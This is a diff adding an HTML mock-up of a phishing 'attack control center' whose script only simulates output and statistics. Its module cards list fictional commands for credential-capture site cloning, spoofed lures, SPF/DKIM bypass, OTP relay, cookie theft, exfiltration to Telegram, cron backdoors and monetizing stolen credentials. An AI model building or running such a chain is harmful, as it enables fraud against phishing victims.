@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PHANTOM // Attack Control Center</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #0a0e0f;
+    color: #00ff9d;
+    font-family: 'Fira Code', 'Courier New', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+  .scanline {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,157,0.02) 2px,rgba(0,255,157,0.02) 4px);
+    pointer-events: none; z-index: 1000;
+  }
+  header {
+    text-align: center; padding: 30px 20px 10px;
+    border-bottom: 1px solid #003b25;
+  }
+  header h1 {
+    font-size: 2.5rem; letter-spacing: 12px;
+    text-shadow: 0 0 20px #00ff9d, 0 0 40px rgba(0,255,157,0.5);
+    animation: glitch 3s infinite;
+  }
+  header p { color: #008f5f; margin-top: 8px; font-size: 0.85rem; letter-spacing: 3px; }
+  @keyframes glitch {
+    0%,90%,100% { transform: none; }
+    92% { transform: translate(2px,-1px); text-shadow: -2px 0 #ff004c; }
+    94% { transform: translate(-2px,1px); text-shadow: 2px 0 #00c3ff; }
+    96% { transform: none; }
+  }
+  .stats-bar {
+    display: flex; justify-content: center; gap: 30px;
+    padding: 15px; background: #0d1315;
+    border-bottom: 1px solid #003b25; flex-wrap: wrap;
+  }
+  .stat { text-align: center; }
+  .stat .val { font-size: 1.4rem; color: #00ff9d; text-shadow: 0 0 10px rgba(0,255,157,0.6); }
+  .stat .label { font-size: 0.65rem; color: #007a52; letter-spacing: 2px; margin-top: 2px; }
+  .controls {
+    display: flex; gap: 10px; padding: 15px; justify-content: center;
+    background: #0d1315; border-bottom: 1px solid #003b25;
+  }
+  .controls button, .controls select {
+    background: #0a2a1c; color: #00ff9d; border: 1px solid #00ff9d;
+    padding: 8px 16px; font-family: inherit; cursor: pointer;
+    font-size: 0.75rem; letter-spacing: 1px; transition: all 0.2s;
+  }
+  .controls button:hover { background: #00ff9d; color: #000; box-shadow: 0 0 15px rgba(0,255,157,0.6); }
+  .controls select { cursor: pointer; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+    gap: 16px; padding: 20px; max-width: 1400px; margin: 0 auto;
+  }
+  .module {
+    background: linear-gradient(145deg, #0d1416, #0a1113);
+    border: 1px solid #003b25; border-radius: 6px; padding: 16px;
+    cursor: pointer; transition: all 0.25s; position: relative;
+    opacity: 0; transform: translateY(20px); animation: fadeIn 0.5s forwards;
+  }
+  .module:nth-child(odd) { animation-delay: 0.05s; }
+  .module:nth-child(even) { animation-delay: 0.1s; }
+  @keyframes fadeIn { to { opacity: 1; transform: translateY(0); } }
+  .module:hover {
+    border-color: #00ff9d; box-shadow: 0 0 20px rgba(0,255,157,0.15);
+    transform: translateY(-3px);
+  }
+  .module .num { font-size: 0.65rem; color: #006644; }
+  .module h3 {
+    color: #00ffc8; font-size: 1rem; margin: 6px 0;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .status { width: 7px; height: 7px; border-radius: 50%; display: inline-block; }
+  .status.active { background: #00ff9d; box-shadow: 0 0 8px #00ff9d; animation: pulse 2s infinite; }
+  .status.idle { background: #333; }
+  @keyframes pulse { 50% { opacity: 0.4; } }
+  .module .category { font-size: 0.6rem; color: #008f5f; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; }
+  .module .cmd {
+    background: #060a0b; border: 1px solid #1a2a20; border-radius: 4px;
+    padding: 8px 10px; font-size: 0.7rem; color: #7dffb8;
+    overflow-x: auto; white-space: nowrap; margin: 8px 0;
+  }
+  .module .cmd .flag { color: #00c3ff; }
+  .module .desc { font-size: 0.7rem; color: #5f9c85; line-height: 1.5; }
+  .terminal {
+    max-width: 1400px; margin: 10px auto 30px; padding: 0 20px;
+  }
+  .term-box {
+    background: #060a0b; border: 1px solid #003b25; border-radius: 6px;
+    font-size: 0.75rem; height: 200px; overflow-y: auto; padding: 15px;
+    line-height: 1.7;
+  }
+  .term-box .prompt { color: #00ff00; }
+  .term-box .err { color: #ff4477; }
+  .term-box .ok { color: #00ff9d; }
+  .term-box .info { color: #00c3ff; }
+  footer { text-align: center; padding: 20px; color: #006644; font-size: 0.65rem; border-top: 1px solid #003b25; letter-spacing: 2px; }
+  .modal-overlay {
+    display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85);
+    z-index: 2000; align-items: center; justify-content: center; backdrop-filter: blur(3px);
+  }
+  .modal-overlay.open { display: flex; }
+  .modal {
+    background: #0d1416; border: 1px solid #00ff9d; border-radius: 8px;
+    padding: 25px; max-width: 550px; width: 90%;
+    box-shadow: 0 0 40px rgba(0,255,157,0.2);
+  }
+  .modal h2 { color: #00ffc8; margin-bottom: 15px; }
+  .modal .param { margin: 8px 0; font-size: 0.75rem; }
+  .modal .param b { color: #00c3ff; }
+  .modal .param span { color: #5f9c85; }
+  .modal .close {
+    float: right; background: none; border: 1px solid #00ff9d; color: #00ff9d;
+    padding: 4px 10px; cursor: pointer; font-family: inherit;
+  }
+  .modal .run {
+    margin-top: 15px; background: #00ff9d; color: #000; border: none;
+    padding: 10px 25px; font-family: inherit; font-weight: bold;
+    cursor: pointer; width: 100%; letter-spacing: 1px;
+  }
+  .modal .run:hover { box-shadow: 0 0 20px rgba(0,255,157,0.6); }
+</style>
+</head>
+<body>
+<div class="scanline"></div>
+
+<header>
+  <h1>PHANTOM</h1>
+  <p>\/\/ FULL-STACK SOCIAL ENGINEERING TOOLKIT \/\/</p>
+</header>
+
+<div class="stats-bar">
+  <div class="stat"><div class="val" id="s-targets">0</div><div class="label">TARGETS</div></div>
+  <div class="stat"><div class="val" id="s-sent">0</div><div class="label">SENT</div></div>
+  <div class="stat"><div class="val" id="s-opens">0</div><div class="label">OPENS</div></div>
+  <div class="stat"><div class="val" id="s-clicks">0</div><div class="label">CLICKS</div></div>
+  <div class="stat"><div class="val" id="s-creds">0</div><div class="label">CREDS</div></div>
+  <div class="stat"><div class="val" id="s-sessions">0</div><div class="label">SESSIONS</div></div>
+</div>
+
+<div class="controls">
+  <select id="camp-select">
+    <option>CAMPAIGN: Q2-2024</option>
+    <option>CAMPAIGN: RED-TEAM-ALPHA</option>
+    <option>CAMPAIGN: OPERATION-GLASSHOUSE</option>
+  </select>
+  <button onclick="runAll()">▶ EXECUTE FULL CHAIN</button>
+  <button onclick="randomize()">⇄ RANDOMIZE FINGERPRINT</button>
+  <button onclick="clearTerm()">✕ CLEAR LOG</button>
+</div>
+
+<div class="grid" id="grid"></div>
+
+<div class="terminal">
+  <div style="color:#008f5f;font-size:0.65rem;letter-spacing:2px;margin-bottom:6px;">// LIVE OUTPUT //</div>
+  <div class="term-box" id="term"><span class="prompt">root@phantom:~#</span> phantom toolkit v4.2.1 initialized — awaiting commands…</div>
+</div>
+
+<footer>PHANTOM // RED TEAM OPERATIONS // USE FOR AUTHORIZED TESTING ONLY</footer>
+
+<div class="modal-overlay" id="overlay" onclick="if(event.target===this)closeModal()">
+  <div class="modal">
+    <button class="close" onclick="closeModal()">ESC</button>
+    <h2 id="m-title"></h2>
+    <div id="m-body"></div>
+    <button class="run" id="m-run" onclick="execModule()">EXECUTE MODULE</button>
+  </div>
+</div>
+
+<script>
+const MODULES = [
+  {n:"01",name:"config",cat:"Recon & Setup",cmd:"config --smtp 192.168.1.100:587 --twilio ACxxxx:token --db postgres://u:p@h/db",desc:"Initialize system parameters, SMTP relays, Twilio SMS, and database backends.",params:[["--smtp","SMTP relay host:port"],["--twilio","Twilio SID:auth_token"],["--db","PostgreSQL connection string"]],status:1},
+  {n:"02",name:"harvest",cat:"Recon & Setup",cmd:"harvest --domain example.com --depth 3 -o targets.json",desc:"Target discovery via LinkedIn scraping with headless Chrome and proxy rotation.",params:[["--domain","Root domain to enumerate"],["--depth","Crawl depth for subdomains"],["--proxy","Rotating proxy pool"]],status:1},
+  {n:"03",name:"clone",cat:"Delivery",cmd:"clone https://target.com/login --mirror --ssl --proxy 1.1.1.1",desc:"Mirror target websites while injecting credential capture scripts transparently.",params:[["--mirror","Full recursive copy"],["--ssl","Strip/replace TLS certificates"],["--inject","JS payload for credential capture"]],status:0},
+  {n:"04",name:"forge",cat:"Delivery",cmd:"forge --template password_reset --sender support@example.com --urgency high",desc:"Generate convincing lures (password resets, invoices) with dynamic templating.",params:[["--template","Lure type: reset/invoice/mfa"],["--sender","Spoofed sender address"],["--urgency","Low/medium/high psychological pressure"]],status:0},
+  {n:"05",name:"deliver",cat:"Delivery",cmd:"deliver --mode smtp --targets targets.json --rate 50/60 --threads 5",desc:"Launch campaigns via SMTP/SMS/chat with rate limiting and IP rotation.",params:[["--mode","smtp | sms | webhook"],["--rate","Messages per interval"],["--threads","Parallel send workers"]],status:1},
+  {n:"06",name:"spoof",cat:"Evasion",cmd:"spoof --domain evil.com --bypass spf,dkim,dmarc",desc:"Configure email headers and DNS records to bypass SPF/DKIM/DMARC checks.",params:[["--bypass","Authentication mechanisms to defeat"],["--dkim","Sign with forged selector"]],status:0},
+  {n:"07",name:"capture",cat:"Interception",cmd:"capture --listen 0.0.0.0:443 --relay https://real-site.com/2fa",desc:"Host phishing pages with real-time credential relay to legitimate services.",params:[["--relay","Transparent upstream relay target"],["--tls","Auto Let's Encrypt or forged cert"]],status:1},
+  {n:"08",name:"otp-intercept",cat:"Interception",cmd:"otp-capture --listen 0.0.0.0:443 --relay https://real.com/2fa",desc:"2FA/OTP interception — capture and forward one-time codes in real time.",params:[["--relay","Relay target for seamless forwarding"],["--window","OTP validity window (sec)"]],status:0},
+  {n:"09",name:"hijack",cat:"Post-Exploit",cmd:"session-hijack --inject js/payload.js --trigger onsubmit",desc:"Steal session cookies/tokens via XSS and injected JavaScript on submit events.",params:[["--inject","Malicious JS payload path"],["--trigger","DOM event that fires exfil"]],status:1},
+  {n:"10",name:"exfil",cat:"Post-Exploit",cmd:"exfil --dest s3://bucket --encrypt aes256 --tg-bot 12345:ABC",desc:"Export stolen credentials to encrypted S3 buckets or a Telegram bot.",params:[["--dest","S3/FTP/Telegram destination"],["--encrypt","At-rest encryption cipher"]],status:1},
+  {n:"11",name:"persist",cat:"Post-Exploit",cmd:"persist --method cronjob --payload backdoor.sh --cleanup",desc:"Maintain access via cron jobs, SSH keys, RDP, or cloud API backdoors.",params:[["--method","cronjob | ssh-key | cloud-api"],["--cleanup","Remove artifacts after install"]],status:0},
+  {n:"12",name:"obfuscate",cat:"Support",cmd:"obfuscate --url https://evil.com --output hxxps://goo.gl/xxxx",desc:"Generate shortened URLs and redirect chains to evade detection filters.",params:[["--chains","Redirect hop count"],["--openreset","Reset trailing trackres"]],status:0},
+  {n:"13",name:"analytics",cat:"Support",cmd:"analytics --campaign Q2-2024 --metrics opens,clicks,conversions",desc:"Track opens/clicks/conversions with fingerprinting and geo-IP resolution.",params:[["--metrics","Comma-separated KPI list"],["--geoip","MaxMind DB integration"]],status:1},
+  {n:"14",name:"monetize",cat:"Post-Exploit",cmd:"monetize --out xmr --vault 4AbQ...xK9",desc:"Auto-convert compromised credentials to crypto or marketplace value.",params:[["--out","Currency output (xmr/btc)"],["--vault","Receiving wallet address"]],status:0},
+  {n:"15",name:"anonymize",cat:"Evasion",cmd:"anonymize --tor --rot 300 --dns 1.1.1.1",desc:"Route all module traffic through Tor with DNS-over-HTTPS and auto-rotation.",params:[["--tor","Enable SOCKS5 Tor circuit"],["--rot","Circuit rotation interval (s)"]],status:0},
+  {n:"16",name:"rotate",cat:"Evasion",cmd:"rotate --smtp-pool 25 --ip-pool 100 --ttl 60",desc:"Rotate SMTP relays, source IPs, and sending identities per campaign batch.",params:[["--smtp-pool","Pool size of warm relays"],["--ip-pool","Residential proxy pool size"]],status:1}
+];
+
+let selected = null;
+const grid = document.getElementById('grid');
+const term = document.getElementById('term');
+
+MODULES.forEach((m,i) => {
+  const el = document.createElement('div');
+  el.className = 'module';
+  el.style.animationDelay = (i*0.04)+'s';
+  const highlighted = m.cmd.replace(/(--[a-z-]+)/g,'<span class="flag">$1</span>');
+  el.innerHTML = `
+    <div class="num">${m.n} // MODULE</div>
+    <h3><span class="status ${m.status?'active':'idle'}"></span>${m.name}</h3>
+    <div class="category">${m.cat}</div>
+    <div class="cmd">${highlighted}</div>
+    <div class="desc">${m.desc}</div>`;
+  el.onclick = () => openModal(i);
+  grid.appendChild(el);
+});
+
+function openModal(i){
+  selected = i;
+  const m = MODULES[i];
+  document.getElementById('m-title').textContent = `[${m.n}] ${m.name} — ${m.cat}`;
+  document.getElementById('m-body').innerHTML = `<div class="cmd">${m.cmd.replace(/(--[a-z-]+)/g,'<span class="flag">$1</span>')}</div>` +
+    m.params.map(p=>`<div class="param"><b>${p[0]}</b> — <span>${p[1]}</span></div>`).join('');
+  document.getElementById('overlay').classList.add('open');
+}
+function closeModal(){ document.getElementById('overlay').classList.remove('open'); }
+
+function log(msg, cls='ok'){
+  const line = document.createElement('div');
+  line.innerHTML = `<span class="prompt">root@phantom:~#</span> <span class="${cls}">${msg}</span>`;
+  term.appendChild(line);
+  term.scrollTop = term.scrollHeight;
+}
+
+function execModule(){
+  if(selected===null) return;
+  const m = MODULES[selected];
+  log(`Executing module [${m.name}] …`,'info');
+  const steps = [
+    ['Loading payload definitions…','info'],
+    ['Validating parameters ✓','ok'],
+    ['Establishing encrypted C2 channel ✓','ok'],
+    [`[${m.name}] completed — exit code 0`,'ok']
+  ];
+  steps.forEach((s,idx) => setTimeout(()=>log(s[0],s[1]), 400*(idx+1)));
+  bumpStat();
+}
+
+function runAll(){
+  log('≫ INITIATING FULL ATTACK CHAIN','info');
+  MODULES.forEach((m,i) => {
+    setTimeout(()=>{
+      log(`[${m.n}] ${m.name} → deployed ✓`);
+      if(m.name==='deliver') log(`Campaign "${document.getElementById('camp-select').value}" is LIVE`, 'info');
+      bumpStat(); bumpStat();
+    }, i*350);
+  });
+  setTimeout(()=>log('ALL MODULES ACTIVE — AWAITING HARVEST','ok'), MODULES.length*350+300);
+}
+
+function randomize(){
+  const ua = ['Chrome/124.0','Firefox/126.0','Safari/17.4','Edge/124.0'];
+  const fp = ['win11-x64','macos-arm64','ubuntu-22','win10-x86'];
+  const tz = ['UTC-5','UTC+1','UTC+8','UTC-3'];
+  log(`Fingerprint → UA:${ua[Math.floor(Math.random()*ua.length)]} | FP:${fp[Math.floor(Math.random()*fp.length)]} | TZ:${tz[Math.floor(Math.random()*tz.length)]}`,'info');
+  log('DNS leak test: PASS | WebRTC: BLOCKED | Canvas: RANDOMIZED ✓','ok');
+}
+
+function clearTerm(){ term.innerHTML = `<span class="prompt">root@phantom:~#</span> `; }
+
+let stats = {t:1247,s:843,o:516,c:291,cr:37,ss:12};
+function bumpStat(){
+  stats.s += Math.floor(Math.random()*4);
+  stats.o += Math.floor(Math.random()*3);
+  stats.c += Math.random()>0.5?1:0;
+  if(Math.random()>0.85) stats.cr++;
+  if(Math.random()>0.93) stats.ss++;
+  renderStats();
+}
+function renderStats(){
+  document.getElementById('s-targets').textContent = stats.t.toLocaleString();
+  document.getElementById('s-sent').textContent = stats.s.toLocaleString();
+  document.getElementById('s-opens').textContent = stats.o.toLocaleString();
+  document.getElementById('s-clicks').textContent = stats.c.toLocaleString();
+  document.getElementById('s-creds').textContent = stats.cr.toLocaleString();
+  document.getElementById('s-sessions').textContent = stats.ss.toLocaleString();
+}
+renderStats();
+</script>
+</body>
+</html>
